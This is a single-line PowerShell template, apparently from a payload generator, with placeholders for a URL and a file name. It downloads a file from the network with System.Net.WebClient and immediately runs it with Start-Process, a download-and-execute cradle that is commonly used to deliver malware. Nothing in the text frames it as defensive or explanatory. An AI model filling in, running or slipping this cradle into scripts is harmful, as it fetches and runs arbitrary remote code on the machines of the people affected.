%%isHTTPS%%(New-Object System.Net.WebClient).DownloadFile('%%url%%', '%%filename%%'); Start-Process '%%filename%%'